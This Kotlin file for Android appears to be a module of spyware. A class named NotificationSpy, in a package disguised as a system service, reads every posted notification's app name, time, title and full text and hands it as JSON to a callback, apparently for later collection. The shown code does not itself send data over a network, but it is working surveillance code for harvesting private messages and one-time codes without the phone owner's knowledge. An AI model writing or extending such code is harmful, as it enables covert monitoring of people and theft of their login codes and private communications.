// [context: Kotlin, Android API 26+, notification listener reads all posted notifications]
package com.system.service.modules.notifications

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

class NotificationSpy : NotificationListenerService() {

    var onNotification: ((JSONObject) -> Unit)? = null

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val extras = sbn.notification.extras
        val obj = JSONObject().apply {
            put("pkg", sbn.packageName)
            put("ts", sbn.postTime)
            put("title", extras.getCharSequence("android.title")?.toString() ?: "")
            put("text", extras.getCharSequence("android.text")?.toString() ?: "")
            put("big_text", extras.getCharSequence("android.bigText")?.toString() ?: "")
        }
        onNotification?.invoke(obj)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}
}
